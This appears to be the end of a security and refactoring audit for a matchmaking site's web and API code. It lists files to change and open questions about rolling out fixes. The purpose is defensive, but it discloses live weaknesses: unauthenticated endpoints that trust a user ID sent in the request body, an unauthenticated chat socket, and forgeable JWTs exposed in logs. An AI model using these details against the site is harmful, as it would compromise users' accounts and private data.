- /var/www/banjaramatch.com/app.js:67-111 htmlRedirectMap: existing 301 map that must be kept in the monorepo to protect production URLs
- /var/www/banjaramatch.com/routes/index.js:227-231: legacy redirect block, the place to add the lowercase-slug 301
- /var/www/banjaramatch.com/utils/generateAllSitemaps.js (+generateSitemap/generateBlogSitemap/generateRegionalSitemap/generateSitemapIndex): sitemap pipeline to keep; add atomic writes and an empty-result guard
- /var/www/api.banjaramatch.com/middleware/authMiddleware.js authenticate(): already reads the cookie or Bearer token; apply it router-wide in routes/userRoutes.js
- /var/www/api.banjaramatch.com/controllers/UserController.js:29-49 applyPrivacySettings(): extend into the single profile serializer that enforces every settings.* field and strips secrets
- /var/www/banjaramatch.com/app.js:17-21 helmet: already installed; enable contentSecurityPolicy with nonces once inline scripts are moved out
- /var/www/banjaramatch.com/views/pages/user-chat.ejs:921-1076: working Agora call UI that relies on server gating; keep it but authenticate the socket

## open_questions
- Does the Flutter app (banjaramatch_app) call the same unauthenticated endpoints with my_user_id in the body and connect to Socket.IO without a token? Enforcing auth on the API needs a coordinated app release or a compatibility window.
- Does the Firebase API key AIza<redacted-firebase-web-key> used by the API's confirmPasswordReset belong to project socialmedia-dcdd8 (the web uses AIzaSyBEQ...)? If not, password resets fail today.
- What premium gating does the product actually want? Plans list 'Send unlimited interests' and 'View contact details' (UserController.js:3066), but there are no daily interest limits, contact-view limits or photo blur anywhere in the web or API. Should these be built server-side?
- Should city pages that are isActive:true but isPublished:false be publicly reachable through /:slug? The public lookup currently ignores isPublished.
- Is rotating JWT_SECRET (which logs out every web and app session) acceptable now, given that tokens are forgeable and thousands are already in the logs?
- Should the web keep calling api.banjaramatch.com from the browser, or should the monorepo proxy /api through the web server (same origin, httpOnly cookie, no CORS)? This decides how cookies and CSP are designed.
